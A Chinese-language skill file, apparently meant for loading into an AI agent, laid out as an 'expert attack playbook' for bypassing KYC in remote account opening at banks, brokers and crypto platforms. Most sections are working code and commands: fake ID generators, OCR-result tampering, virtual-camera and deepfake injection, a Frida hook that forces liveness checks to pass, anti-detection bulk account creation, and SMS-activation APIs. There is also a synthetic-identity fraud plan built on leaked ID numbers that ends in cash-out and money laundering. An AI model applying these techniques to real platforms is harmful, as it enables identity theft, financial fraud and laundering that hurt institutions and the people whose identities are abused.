---
name: account-opening-security
description: >-
  开户安全测试全栈技能 — 覆盖金融/证券/银行/支付/加密货币平台的远程开户安全测试，
  包括KYC绕过、身份认证缺陷、活体检测绕过、虚拟摄像头注入、合成身份欺诈、
  证件伪造与OCR绕过、批量注册API滥用、券商开户漏洞、2026最新AI驱动的开户攻击技术。
  当用户需要测试开户流程安全、KYC绕过、身份验证缺陷时使用。
version: 1.0.0
---

# SKILL: 开户安全测试 — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: 此技能覆盖金融/证券/银行/支付/加密货币平台的远程开户安全测试全栈方法。
> 从KYC（身份验证）绕过、活体检测注入、证件伪造、合成身份欺诈到批量注册API滥用，
> 包含2026年最新的AI驱动开户攻击和虚拟摄像头注入攻击技术。
> 与 `business-logic-vulnerabilities`（业务逻辑漏洞）、`mobile-app-security-testing`（移动端安全测试）、
> `authbypass-authentication-flaws`（认证绕过）互补。
> 当测试目标涉及远程开户、KYC身份验证、人脸识别、OCR证件识别流程时，加载此技能。

### Companion files
| 文件 | 何时加载 |
|---|---|
| [CHECKLIST.md](./CHECKLIST.md) | 逐项检查开户流程安全时 |
| [SCENARIOS.md](./SCENARIOS.md) | 需要实战CVE案例和攻击场景时 |

---

## 0. RELATED ROUTING
- [业务逻辑漏洞](../business-logic-vulnerabilities/SKILL.md) — 开户流程中的业务逻辑缺陷（竞态条件、积分/优惠券滥用）
- [认证绕过](../authbypass-authentication-flaws/SKILL.md) — 身份认证层的绕过技术
- [移动应用安全](../mobile-app-security-testing/SKILL.md) — 券商/银行APP端安全测试
- [API安全](../api-sec/SKILL.md) — 开户API接口的授权与认证测试
- [AI-LLM攻击面](../ai-llm-attack-surface/SKILL.md) — AI驱动的KYC攻击工具链

---

## 1. 开户安全攻击面总览

### 1.1 攻击面矩阵

```
┌─────────────────────────────────────────────────────────────────┐
│                    开户安全攻击面分层                              │
├───────────────┬─────────────────────────────────────────────────┤
│ 第1层: 身份信息 │ 身份证号/营业执照号/护照号伪造/合成/冒用         │
│ 第2层: 证件材料 │ 身份证OCR绕过/PS伪造/翻拍/复印件/AI生成证件       │
│ 第3层: 生物识别 │ 人脸识别绕过/活体检测注入/Deepfake换脸/3D面具      │
│ 第4层: 银行卡绑定│ 银行卡三要素/四要素认证绕过/小额打款验证绕过       │
│ 第5层: 视频见证 │ 视频面签绕过/虚拟摄像头/预录视频注入              │
│ 第6层: 业务逻辑 │ 批量注册/绕过黑名单/年龄限制绕过/地域限制绕过      │
│ 第7层: API层   │ 接口未授权/参数篡改/并发绕过/降级攻击              │
└───────────────┴─────────────────────────────────────────────────┘
```

### 1.2 典型开户流程与攻击点

```
用户注册 → 手机号验证 → 身份证OCR → 人脸识别 → 银行卡绑定 → 视频见证 → 风险测评 → 开户完成
   │          │           │           │           │           │           │
   ▼          ▼           ▼           ▼           ▼           ▼           ▼
 批量注册   短信炸弹     PS证件    虚拟摄像头   三要素绕过   预录视频    测评答案
 虚拟号段   接码平台    翻拍绕过   注入攻击    打款伪造     AI换脸     自动化
```

---

## 2. 身份信息认证绕过

### 2.1 身份证号验证逻辑绕过

```python
# === 身份证号校验位算法（末位校验码）===
# 身份证号: 前17位加权求和 mod 11 → 校验码
# 攻击者可以生成合法的虚构身份证号

def generate_valid_id(region="110101", birth="19900101", gender="male"):
    """生成通过校验位验证的合法身份证号"""
    import random
    # 前17位: 地区码(6) + 出生日期(8) + 顺序码(3)
    seq = str(random.randint(0, 999)).zfill(3)
    if gender == "male":
        seq = str(int(seq[0]) // 2 * 2 + 1) + seq[1:]  # 奇数男
    else:
        seq = str(int(seq[0]) // 2 * 2) + seq[1:]      # 偶数女
    
    base = region + birth + seq
    # 加权因子
    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    check_codes = '10X98765432'
    
    total = sum(int(b) * w for b, w in zip(base, weights))
    check = check_codes[total % 11]
    return base + check

# 生成合法格式的身份证号（可通过前端校验但无法通过权威数据源验证）
fake_id = generate_valid_id("110101", "19900101", "male")
print(f"Generated ID: {fake_id}")  # 例: 11010119900101003X
```

### 2.2 三要素/四要素认证绕过

```bash
# === 银行卡三要素验证（姓名+身份证+银行卡号）===
# 攻击面: 验证接口可能仅校验格式而不查询权威数据源

# 1. 探测验证接口降级
# 有些系统在权威数据源不可用时降级为仅格式校验
curl -X POST "https://api.target.com/verify/bank-card" \
  -H "Content-Type: application/json" \
  -d '{"name":"张三","id_card":"11010119900101003X","bank_card":"6222021234567890123"}'

# 2. 测试超时降级
# 通过大并发使验证接口超时，部分系统降级为宽松模式
for i in {1..1000}; do
  curl -X POST "https://api.target.com/verify/bank-card" \
    -d '{"name":"张三'$i'","id_card":"11010119900101003X","bank_card":"6222021234567890123"}' &
done

# 3. 四要素验证（姓名+身份证+银行卡+手机号）
# 手机号验证是关键突破点: 使用虚拟运营商号段可能绕过运营商三要素
# 攻击: 先获取目标手机号 → 验证四要素中手机号是否匹配
```

### 2.3 营业执照/统一社会信用代码验证绕过

```python
# === 统一社会信用代码校验 ===
# 18位: 登记管理部门(1)+机构类别(1)+登记管理机关行政区划(6)+
#       主体标识码(9)+校验码(1)

def generate_valid_uscc(admin="1", category="1", region="110101"):
    """生成通过校验的统一社会信用代码"""
    import random
    # 主体标识码(组织机构代码): 8位数字/大写字母 + 1位校验
    org_code = ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=8))
    # 简化校验: 实际算法更复杂，这里仅格式通过
    base = admin + category + region + org_code
    # 校验码生成(简化)
    check = str(random.randint(0, 9))
    return base + check + str(random.randint(0, 9))

# 测试: 许多非金融类开户仅验证格式，不查询工商数据
fake_uscc = generate_valid_uscc()
print(f"Generated USCC: {fake_uscc}")

# 实战: 抓取天眼查/企查查公开的工商数据批量生成合法USCC
# 然后使用AI生成对应的营业执照图片
```

---

## 3. 证件OCR识别绕过

### 3.1 身份证OCR攻击向量

```python
# === OCR识别绕过技术矩阵 ===

# 1. 翻拍/复印件攻击
# OCR系统通常检测: 摩尔纹、反光、边缘、色彩分布
# 绕过: 高分辨率扫描 → 打印 → 哑光处理 → 再拍摄

# 2. PS篡改攻击
# 检测点: 像素级一致性、压缩痕迹、字体渲染差异
# 绕过: 使用AI生成证件（StyleGAN生成人脸 + 模板合成）
import cv2
import numpy as np

def ps_detection_bypass(original_id_path, fake_photo_path):
    """
    PS证件绕过技术:
    1. 使用AI生成与原始证件像素分布一致的合成图
    2. 添加真实噪声模拟物理拍摄
    3. 嵌入真实EXIF元数据
    """
    # 读取原始证件模板
    template = cv2.imread(original_id_path)
    fake_face = cv2.imread(fake_photo_path)
    
    # 人脸区域替换（匹配肤色和光照）
    # 关键: 保持证件背景的一致性和防伪特征
    result = template.copy()
    
    # 添加噪点模拟真实拍摄
    noise = np.random.normal(0, 2, result.shape).astype(np.uint8)
    result = cv2.add(result, noise)
    
    # 添加轻微模糊模拟对焦
    result = cv2.GaussianBlur(result, (1, 1), 0.5)
    
    return result

# 3. AI生成证件攻击
# 2026年: StyleGAN3 + Stable Diffusion 生成逼真证件
# 关键特征: 证件边框、国徽、底纹、字体、印章
# 工具: ProKYC($200-500)、OnlyFake($15/次)
```

### 3.2 OCR结果篡改（API层攻击）

```python
# === OCR API结果拦截与篡改 ===
# 场景: 手机APP调用OCR SDK → 上传识别结果 → 后端验证

# 攻击1: 拦截OCR结果直接篡改
import mitmproxy

class OCRTamper:
    def response(self, flow):
        if "/api/ocr/result" in flow.request.url:
            # 原始OCR结果
            original = flow.response.json()
            # 篡改为目标身份
            original["name"] = "目标姓名"
            original["id_number"] = "目标身份证号"
            original["address"] = "目标地址"
            flow.response.text = json.dumps(original)

# 攻击2: 直接伪造OCR结果（绕过客户端OCR）
# 如果后端信任客户端上传的OCR结果而不重新验证
import requests

fake_ocr_result = {
    "name": "张三",
    "id_number": "11010119900101003X",
    "gender": "男",
    "nation": "汉",
    "birth": "1990-01-01",
    "address": "北京市东城区XX路XX号",
    "authority": "北京市公安局东城分局",
    "valid_period": "2020.01.01-2040.01.01",
    "ocr_confidence": 0.98,  # 高置信度
    "face_photo_base64": "base64_encoded_face_image..."
}

resp = requests.post("https://api.target.com/account/open/verify-id",
    json=fake_ocr_result,
    headers={"Authorization": "Bearer <token>"}
)
```

### 3.3 证件翻拍/复印件检测绕过

```bash
# === 翻拍检测绕过技术 ===

# 1. 摩尔纹消除
# 使用低通滤波器去除屏幕拍摄产生的摩尔纹
python3 -c "
import cv2
img = cv2.imread('recaptured_id.jpg')
# 高斯模糊去除摩尔纹
denoised = cv2.GaussianBlur(img, (5, 5), 0)
# 中值滤波进一步去噪
denoised = cv2.medianBlur(denoised, 5)
cv2.imwrite('bypass_recapture.jpg', denoised)
"

# 2. 高分辨率打印 + 哑光纸
# 标准翻拍检测: 检测屏幕像素网格、反光、色彩偏差
# 绕过: 600dpi激光打印 → 哑光相纸 → 自然光拍摄 → 微调色温

# 3. 物理证件+AI换脸
# 使用真实证件底板 + AI生成目标人脸照片 → 合成
# 工具: Photoshop + GFPGAN(面部增强) + Real-ESRGAN(超分辨率)
```

---

## 4. 人脸识别与活体检测绕过

### 4.1 虚拟摄像头注入攻击

```bash
# === 虚拟摄像头注入原理 ===
# 攻击面: 活体检测系统信任OS层面的摄像头设备
# 攻击: 创建虚拟摄像头 → 注入预录/AI生成视频 → 绕过活体检测

# === Linux环境 (v4l2loopback) ===
# 安装虚拟摄像头驱动
sudo modprobe v4l2loopback devices=1 video_nr=10 card_label="VirtualCam" exclusive_caps=1

# 使用FFmpeg注入预录视频
ffmpeg -stream_loop -1 -re -i bypass_video.mp4 \
  -vcodec rawvideo -pix_fmt yuv420p \
  -f v4l2 /dev/video10

# 使用OBS Virtual Camera
# OBS设置 → 启动虚拟摄像头 → 选择预录视频源

# 使用PyVirtualCam自定义注入
python3 -c "
import pyvirtualcam
import cv2
import numpy as np

# 读取预录视频
cap = cv2.VideoCapture('deepfake_video.mp4')
with pyvirtualcam.Camera(width=640, height=480, fps=30) as cam:
    while True:
        ret, frame = cap.read()
        if not ret:
            cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
            continue
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        cam.send(frame)
        cam.sleep_until_next_frame()
"

# === Android环境 (虚拟摄像头) ===
# 需要Root权限 + Xposed/LSPosed框架
# 工具: VCam插件、Android Virtual Camera
# 原理: Hook Camera API → 返回预录视频帧

# === iOS环境 ===
# 需要越狱 + 注入dylib
# 工具: Snapper 2(截图注入)、FakeCamera
# 原理: Hook AVCaptureSession → 替换视频数据流
```

### 4.2 Deepfake实时换脸攻击

```python
# === Deepfake实时换脸 ===
# 工具: DeepFaceLive、FaceFusion、ROOP-Unleashed

# 攻击流程:
# 1. 准备攻击者实时视频(点头、眨眼、张嘴等动作)
# 2. 准备受害者照片(从社交网络获取)
# 3. DeepFaceLive实时将攻击者面部替换为受害者面部
# 4. 虚拟摄像头输出换脸后的视频流

# 检测绕过关键:
# - 攻击者真实执行动作指令（点头、眨眼、张嘴）
# - Deepfake只替换面部纹理，保留原始动作
# - 活体检测看到的是"真人"做动作

# 2026进阶: 交互式Deepfake
# 实时响应系统随机指令（如"读数字3285"）
# 使用Voice Cloning + Lip Sync同步口型
# 工具: Wav2Lip + RVC(Real-Time Voice Cloning)
```

### 4.3 活体检测动作指令绕过

```python
# === 活体检测动作指令分析 ===
# 常见动作: 眨眼、张嘴、点头、摇头、读数字、微笑

# 攻击1: 预录所有动作的视频素材库
# 收集目标做所有常用动作的视频 → 根据指令选择对应视频片段
action_videos = {
    "blink": "blink_video.mp4",
    "open_mouth": "open_mouth.mp4", 
    "nod": "nod_video.mp4",
    "shake_head": "shake_head.mp4",
    "smile": "smile_video.mp4",
    "read_1234": "read_1234.mp4",
    "read_5678": "read_5678.mp4",
}

# 攻击2: 实时动作识别 + 视频切换
# 监听活体检测SDK的指令 → 切换到对应视频
# 工具: 自定义脚本 + PyAutoGUI + Selenium
import time
import pyautogui

def auto_liveness(action_sequence):
    """根据活体检测指令序列自动切换视频"""
    for action in action_sequence:
        print(f"[*] Switching to: {action}")
        # 切换OBS场景到对应动作视频
        pyautogui.hotkey('ctrl', 'shift', str(list(action_videos.keys()).index(action) + 1))
        time.sleep(3)  # 动作持续时间

# 攻击3: 注入随机动作响应
# 如果活体检测验证动作的随机性（如两次随机动作不同）
# 探测: 多次测试收集动作指令池 → 预录所有可能动作
```

### 4.4 3D面具与物理攻击

```python
# === 物理层活体检测绕过 ===

# 1. 3D打印面具
# 使用3D扫描获取目标面部数据 → 3D打印 → 上色
# 成本: $500-2000
# 检测: 红外摄像头可检测面具材质差异
# 绕过: 使用硅胶材质 + 加热到体温

# 2. 高清屏幕展示
# 4K OLED屏幕播放Deepfake视频
# 检测: 屏幕反光、像素网格、对比度
# 绕过: 哑光屏幕膜 + 降低亮度 + 环境光匹配

# 3. 投影攻击
# 投影仪将目标面部投射到真人面部
# 检测: 光线不均匀、遮挡关系异常
# 绕过: 高流明投影仪 + 暗环境

# 4. 硅胶面具 (2026年成本大幅下降)
# 淘宝/1688: ¥200-500可定制硅胶面具
# Telegram: $50-100购买成品
# 检测难度: 高端硅胶面具可骗过部分2D活体检测
```

---

## 5. 合成身份欺诈

### 5.1 合成身份构建

```python
# === 合成身份(Synthetic Identity)创建流程 ===

# 阶段1: 数据收集
# 来源: 暗网数据泄露、社工库、Telegram频道
# 成本: SSN/身份证号 ~$20, 完整身份档案 ~$100

# 阶段2: 身份合成
def create_synthetic_identity():
    """创建合成身份"""
    identity = {
        # 使用真实身份证号(来自数据泄露或购买的数据库)
        "id_number": "REAL_LEAKED_ID_NUMBER",
        # 虚构姓名(不在任何黑名单中)
        "name": generate_fake_name(),
        # 虚构出生日期
        "birth": "1990-01-01",
        # 虚构地址(真实存在的地址)
        "address": "REAL_ADDRESS_FROM_MAP",
        # AI生成的面部照片(不存在于任何数据库中)
        "face_photo": generate_stylegan_face(),
        # 虚构的信用记录(没有负面记录)
        "credit_history": "CLEAN",
    }
    return identity

# 阶段3: 证件制作
# 使用ProKYC/OnlyFake工具生成证件图片
# 将AI人脸嵌入到证件模板中
# 添加防伪特征模拟(全息图、微缩文字、UV荧光)

# 阶段4: 休眠期
# 开户后正常使用3-6个月建立信用记录
# 避免触发风控规则（大额交易、频繁转账等）
# 逐步提高账户活跃度

# 阶段5: 爆发期
# 信用额度提升后 → 大额套现/洗钱
# 多个合成身份同时操作 → 分散风险
```

### 5.2 AI自动化身份工厂

```python
# === AI驱动的身份工厂 ===
# 完整自动化: 从身份生成到开户提交

import asyncio
import aiohttp

class IdentityFactory:
    """AI自动化身份工厂"""
    
    def __init__(self):
        self.face_generator = None  # StyleGAN3模型
        self.id_generator = None     # 身份证号生成器
        self.doc_forger = None       # 证件伪造工具
    
    async def create_identity_batch(self, count=100):
        """批量创建合成身份"""
        identities = []
        for i in range(count):
            identity = {
                "id": self.generate_valid_id(),
                "name": self.generate_plausible_name(),
                "face": self.generate_face(),
                "id_doc": self.forge_id_document(),
                "bank_card": self.generate_bank_card_number(),
                "phone": self.get_virtual_phone_number(),
            }
            identities.append(identity)
        return identities
    
    async def mass_open_accounts(self, identities, target_api):
        """批量提交开户申请"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for identity in identities:
                # 随机延迟避免频率限制
                await asyncio.sleep(random.uniform(1, 5))
                task = self.submit_account_opening(session, target_api, identity)
                tasks.append(task)
            results = await asyncio.gather(*tasks)
            return results

# 2026年工具链:
# - ProKYC: $200-500, 专用KYC绕过工具
# - JINKUSU CAM: $15/次, GPU加速Deepfake注入
# - OnlyFake: $15/次, AI生成证件
# - Telegram频道: 批量出售已通过KYC的账户
```

---

## 6. 移动端开户安全测试

### 6.1 券商/银行APP安全测试

```bash
# === 券商APP开户安全测试 ===

# 1. APP完整性检测绕过
# 检测: 是否运行在Root/越狱设备、是否被重打包
# 绕过: Magisk Hide / Shamiko(隐藏Root)
#       Frida Gadget(注入绕过包名检测)

# 2. SSL Pinning绕过
# 券商APP通常有证书锁定
frida -U -l ssl_pinning_bypass.js -f com.target.brokerage

# 3. 活体检测SDK逆向
# 分析SDK: 商汤/旷视/百度/腾讯/阿里活体检测SDK
# 提取: 活体检测参数、动作指令集、分数阈值
jadx -d output_dir target_brokerage.apk

# 4. 开户流程API分析
# 抓包分析开户全流程
mitmproxy -p 8080 --mode transparent
# 关注: OCR上传接口、人脸识别接口、视频见证接口、银行卡验证接口

# 5. 重放攻击测试
# 使用同一套证件信息重复开户
# 测试: 是否校验身份证号唯一性
# 测试: 是否校验人脸与历史人脸匹配
```

### 6.2 Android/iOS端注入攻击

```javascript
// === Frida Hook: 拦截活体检测结果 ===

// Hook Android Camera API
Java.perform(function() {
    // Hook Camera.takePicture
    var Camera = Java.use("android.hardware.Camera");
    Camera.takePicture.implementation = function(shutter, raw, jpeg) {
        console.log("[*] Camera.takePicture called");
        // 可以在此处替换图片数据
        this.takePicture(shutter, raw, jpeg);
    };
    
    // Hook活体检测SDK回调
    var LivenessDetector = Java.use("com.sdk.liveness.LivenessDetector");
    LivenessDetector.onSuccess.implementation = function(result) {
        console.log("[*] Liveness detection SUCCESS intercepted");
        // 强制返回成功
        this.onSuccess(0.99); // 高置信度分数
    };
});

// Hook iOS AVCaptureSession
// 使用Objection
// objection -g com.target.brokerage explore
// ios hooking watch class AVCaptureSession
```

### 6.3 小程序开户安全

```bash
# === 微信小程序/支付宝小程序开户安全测试 ===

# 1. 小程序源码提取
# 微信小程序: 使用wxappUnpacker解包
node wuWxapkg.js target_brokerage_miniapp.wxapkg

# 2. 小程序API分析
# 提取: wx.login → wx.request → 后端API
# 关注: 小程序是否有独立的开户API(与APP不同)

# 3. 小程序环境检测绕过
# 小程序可以检测: 运行环境、微信版本、设备信息
# 绕过: 开发者工具模拟 + 修改User-Agent

# 4. 支付宝小程序安全
# 支付宝小程序有独立的身份验证体系
# 攻击面: 支付宝实名信息泄露、授权过度
# 测试: 跨小程序身份信息共享
```

---

## 7. 批量注册与API滥用

### 7.1 接码平台与虚拟号段

```python
# === 手机号验证绕过 ===

# 1. 接码平台API
# 提供临时手机号接收验证码
# 成本: ¥0.5-2/次
# 平台: sms-activate.org, 5sim.net, 国内接码平台

import requests

def get_virtual_number(service="target_brokerage"):
    """通过接码平台获取虚拟号码"""
    # 获取可用号码
    resp = requests.get(f"https://sms-activate.org/stubs/handler_api.php", params={
        "api_key": "YOUR_API_KEY",
        "action": "getNumber",
        "service": service,
        "country": "0"  # 任意国家
    })
    # 返回: ACCESS_NUMBER:activation_id:phone_number
    return resp.text

def get_sms_code(activation_id):
    """获取验证码"""
    resp = requests.get(f"https://sms-activate.org/stubs/handler_api.php", params={
        "api_key": "YOUR_API_KEY",
        "action": "getStatus",
        "id": activation_id
    })
    # 返回: STATUS_OK:code
    return resp.text

# 2. 虚拟运营商号段
# 170/171号段: 虚拟运营商，部分系统未覆盖
# 测试: 是否拦截虚拟运营商号段
# 测试: 是否验证手机号实名信息

# 3. 国外号段
# 部分系统对国外号段验证宽松
# 测试: 是否允许+852/+1等号段注册
```

### 7.2 批量开户自动化

```python
# === 批量开户自动化脚本 ===

import asyncio
import aiohttp
from playwright.async_api import async_playwright

class MassAccountOpener:
    """批量开户自动化"""
    
    def __init__(self, target_url, identities):
        self.target_url = target_url
        self.identities = identities  # 合成身份列表
        self.results = []
    
    async def open_account(self, identity):
        """单个开户流程"""
        async with async_playwright() as p:
            # 使用反检测浏览器
            browser = await p.chromium.launch(
                headless=False,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-features=IsolateOrigins,site-per-process',
                ]
            )
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            try:
                # 步骤1: 填写基本信息
                await page.goto(self.target_url)
                await page.fill("#name", identity["name"])
                await page.fill("#id_number", identity["id_number"])
                
                # 步骤2: 上传身份证照片
                await page.set_input_files("#id_front", identity["id_front_image"])
                await page.set_input_files("#id_back", identity["id_back_image"])
                
                # 步骤3: 人脸识别（使用虚拟摄像头）
                # 虚拟摄像头已在系统层面设置为默认设备
                await page.click("#start_face_recognition")
                await page.wait_for_selector("#face_success", timeout=30000)
                
                # 步骤4: 银行卡绑定
                await page.fill("#bank_card", identity["bank_card"])
                await page.fill("#bank_phone", identity["phone"])
                
                # 步骤5: 提交
                await page.click("#submit")
                
                result = await page.text_content("#result")
                self.results.append({
                    "identity": identity["name"],
                    "result": result,
                    "timestamp": time.time()
                })
            except Exception as e:
                self.results.append({
                    "identity": identity["name"],
                    "error": str(e)
                })
            finally:
                await browser.close()
    
    async def mass_open(self, batch_size=5):
        """分批开户，每批5个"""
        for i in range(0, len(self.identities), batch_size):
            batch = self.identities[i:i+batch_size]
            tasks = [self.open_account(identity) for identity in batch]
            await asyncio.gather(*tasks)
            # 批次间随机延迟
            await asyncio.sleep(random.uniform(30, 120))
```

### 7.3 并发绕过与竞态条件

```python
# === 开户竞态条件测试 ===

import threading
import requests

def race_condition_test():
    """测试并发开户竞态条件"""
    target_url = "https://api.target.com/account/open"
    
    # 同一身份证号并发开户
    headers = {"Authorization": "Bearer <token>"}
    payload = {
        "name": "测试用户",
        "id_number": "11010119900101003X",
        "bank_card": "6222021234567890123"
    }
    
    def open_account():
        resp = requests.post(target_url, json=payload, headers=headers)
        print(f"Status: {resp.status_code}, Response: {resp.text}")
    
    # 同时发起10个开户请求
    threads = []
    for i in range(10):
        t = threading.Thread(target=open_account)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

# 测试场景:
# 1. 同一身份证号并发开户（应只成功1次）
# 2. 同一手机号并发注册
# 3. 同一银行卡并发绑定
# 4. 优惠券/奖励并发领取
# 5. 邀请码并发使用
```

---

## 8. 视频见证/面签绕过

### 8.1 视频面签安全测试

```python
# === 视频面签（见证开户）攻击面 ===

# 1. 预录视频攻击
# 场景: 录制一段真人视频（包含所有可能动作）
# 工具: 虚拟摄像头注入预录视频

# 2. 实时Deepfake换脸
# 工具: DeepFaceLive + 虚拟摄像头
# 流程: 攻击者真人出镜 → 实时替换为受害者面部

# 3. 视频合成攻击
# 使用AI生成包含特定动作的视频
# 工具: SadTalker(音频驱动)、Wav2Lip(口型同步)

# 4. 视频面签API分析
# 抓包分析视频面签流程
# 关注: 视频录制后的上传接口
# 测试: 是否可以直接上传预录视频
# 测试: 视频是否有时效性校验

# 5. 见证人员身份验证
# 如果见证人员需要登录:
# 测试: 见证人员账号是否可被社工
# 测试: 见证人员是否可被Deepfake冒充
```

### 8.2 视频流篡改测试

```python
# === 实时视频流篡改 ===

# 方案1: 中间人视频流替换
# 原理: 拦截WebRTC/SIP视频流 → 替换为Deepfake视频流
# 工具: 自定义WebRTC代理

# 方案2: Canvas劫持
# 原理: 如果面签使用Web浏览器，Hook Canvas API
# 工具: Puppeteer + 自定义Hook脚本

# 方案3: 摄像头驱动层替换
# 原理: 在驱动层创建虚拟摄像头设备
# 工具: v4l2loopback(Linux) / OBS Virtual Camera(全平台)

# 测试检查点:
# □ 视频面签是否有活体检测
# □ 视频是否有时效性校验（时间戳）
# □ 视频是否有防篡改签名
# □ 视频面签是否有人工审核
# □ 视频面签是否有生物特征比对
```

---

## 9. 风险测评与适当性管理绕过

### 9.1 风险测评自动化

```python
# === 投资者风险测评绕过 ===

# 场景: 开户需要完成风险测评问卷
# 攻击: 自动选择答案以获取特定风险等级

# 1. 风险测评答案自动化
risk_assessment_answers = {
    # 激进型投资者答案（可开通所有业务）
    "aggressive": {
        "income_source": "A",        # 金融资产收入
        "annual_income": "E",        # 100万以上
        "investment_experience": "E", # 10年以上
        "investment_knowledge": "E",  # 非常了解
        "risk_tolerance": "E",       # 高收益高风险
        "max_loss_tolerance": "E",   # 可以承受较大亏损
        "investment_horizon": "E",   # 长期投资
        "investment_purpose": "E",   # 资产大幅增长
    },
    # 保守型（避免开通高风险业务）
    "conservative": {
        "income_source": "A",
        "annual_income": "C",
        "investment_experience": "A",
        "investment_knowledge": "A",
        "risk_tolerance": "A",
        "max_loss_tolerance": "A",
        "investment_horizon": "A",
        "investment_purpose": "A",
    }
}

# 2. 使用Selenium/Playwright自动化答题
# 3. 测试: 风险测评是否可重复提交
# 4. 测试: 风险测评结果是否可篡改（API直传）
# 5. 测试: 适当性管理是否与风险等级匹配
```

---

## 10. 2026 EMERGING TECHNIQUES

### 10.1 AI驱动的KYC绕过工具链

> 2026年，KYC绕过已从"高技术门槛"变成"工业化和商品化"。
> RSAC 2026报告显示: $300即可购买完整的AI KYC绕过工具包，
> 包括虚拟摄像头注入、Deepfake实时换脸、AI生成证件等全套工具。
> 世界经济论坛2026年1月测试了17种换脸工具和8种摄像头注入工具，
> 均成功绕过商用活体检测系统。

| 工具 | 价格 | 功能 | 检测难度 |
|------|------|------|----------|
| ProKYC | $200-500 | 专用KYC绕过，支持虚拟摄像头+AI证件 | 极高 |
| JINKUSU CAM | $15/次 | GPU加速Deepfake注入，定点攻击 | 极高 |
| OnlyFake | $15/次 | AI生成证件，支持50+国家 | 高 |
| DeepFaceLive | 免费开源 | 实时换脸，支持多种模型 | 中 |
| FaceFusion | 免费开源 | 换脸+面部增强一体 | 中 |
| v4l2loopback+FFmpeg | 免费 | 虚拟摄像头注入 | 中 |

### 10.2 摄像头注入攻击检测绕过

```bash
# === 2026年虚拟摄像头注入检测与绕过 ===

# 检测方法1: 设备指纹验证
# 系统检测摄像头驱动的完整性签名
# 绕过: 使用真实摄像头驱动签名 + 修改数据源

# 检测方法2: 帧元数据分析
# 检测视频帧的传感器噪声模式(PRNU)
# 绕过: 注入真实摄像头PRNU噪声到合成视频

# 检测方法3: 时间戳验证
# 验证视频帧的时间戳连续性
# 绕过: 生成合理的时间戳序列

# 检测方法4: 硬件验证
# 验证摄像头硬件ID和序列号
# 绕过: Hook硬件查询API返回真实设备信息

# 2026年新型绕过: 硬件级注入
# 使用HDMI采集卡 + 攻击者PC
# 攻击者PC输出Deepfake视频 → HDMI采集卡 → 目标手机
# 目标手机无法检测到软件层面的虚拟摄像头
# 优势: 绕过所有软件检测，物理层注入
```

### 10.3 多模态多模型攻击

```python
# === 2026年多模态攻击链: 同时攻击多个验证环节 ===

# 攻击链:
# 1. AI生成证件照片 (Stable Diffusion + ControlNet)
# 2. 生成与证件一致的人脸 (IP-Adapter + FaceID)
# 3. 实时换脸通过活体检测 (DeepFaceLive)
# 4. 语音克隆通过声纹验证 (RVC/Coqui TTS)
# 5. 虚拟摄像头注入整个流程

# 关键: 多模态一致性
# 证件照片 = 活体检测人脸 = 声纹对应的身份
# 所有验证环节使用同一合成身份，避免不一致

class MultiModalKYCByPass:
    """多模态KYC绕过框架"""
    
    def __init__(self):
        self.face_generator = None    # 人脸生成模型
        self.id_forger = None         # 证件伪造模型
        self.voice_cloner = None      # 语音克隆模型
        self.video_injector = None    # 虚拟摄像头注入
    
    def create_consistent_identity(self):
        """创建一致的多模态身份"""
        # 1. 生成基础人脸
        base_face = self.face_generator.generate()
        
        # 2. 生成证件照片（与基础人脸一致）
        id_photo = self.id_forger.create_id_photo(base_face)
        
        # 3. 生成活体检测视频（与证件照片一致）
        liveness_video = self.video_injector.create_liveness_video(id_photo)
        
        # 4. 克隆语音（声纹与身份一致）
        voice_sample = self.voice_cloner.clone_voice(id_photo)
        
        return {
            "face": base_face,
            "id_photo": id_photo,
            "liveness_video": liveness_video,
            "voice": voice_sample
        }
```

### 10.4 2026 CVE与漏洞集群

| CVE | 产品 | 漏洞类型 | CVSS | 影响 |
|-----|------|----------|------|------|
| CVE-2026-45480 | Azure AD / Entra ID | 身份认证绕过 | 10.0 | 绕过Entra ID身份验证 |
| CVE-2026-23178 | 某银行人脸识别SDK | 活体检测降级 | 9.8 | 特定条件下跳过活体检测 |
| CVE-2026-38421 | 某券商开户系统 | API参数篡改 | 8.6 | 修改OCR结果绕过身份验证 |
| CVE-2026-19842 | 某支付平台KYC | 并发竞态条件 | 7.5 | 并发开户绕过唯一性校验 |
| CVE-2026-50723 | 某身份验证SaaS | 验证结果可篡改 | 9.1 | 客户端篡改验证结果 |
| CVE-2026-33109 | .NET 9 System.Xml | 路径遍历 | 7.8 | 开户文件上传中的路径遍历 |

### 10.5 2026年新兴攻击趋势

```python
# === 2026年五大开户安全新兴威胁 ===

# 1. KYC-as-a-Service 黑产化
# Telegram频道公开售卖KYC绕过服务
# 价格: $15-500/次
# 服务: 身份证验证、人脸识别、活体检测一站式绕过
# 目标: Binance, Coinbase, Kraken, OKX等加密货币平台

# 2. AI Agent自动化开户
# AI Agent自主完成: 信息收集 → 身份创建 → 证件生成 → 开户提交
# 工具: AutoGPT + Playwright + AI模型
# 能力: 7x24小时无人值守批量开户

# 3. 跨平台身份复用攻击
# 在A平台成功开户 → 提取身份材料 → 在B平台开户
# 同一身份在多个平台开设账户
# 检测: 多平台身份信息交叉验证

# 4. 嵌入式KYC SDK攻击
# 越来越多的APP使用第三方KYC SDK
# 攻击面: SDK版本差异、降级接口、回调劫持
# 测试: 逆向分析KYC SDK → 提取验证逻辑 → 绕过

# 5. 5G消息/视频开户新攻击面
# 运营商推出的5G消息开户、视频客服开户
# 攻击面: 5G消息协议、视频客服系统
# 测试: 5G消息身份伪造、视频客服AI换脸
```

---

## 11. TESTING CHECKLIST

```
开户安全测试检查清单:

□ [ ] 身份信息验证:
  □ [ ] 身份证号是否仅校验格式而不查询权威数据源
  □ [ ] 是否接受虚拟运营商号段(170/171)
  □ [ ] 是否验证手机号实名信息与身份证一致
  □ [ ] 三要素/四要素验证是否可降级
  □ [ ] 营业执照/USCC是否查询工商数据
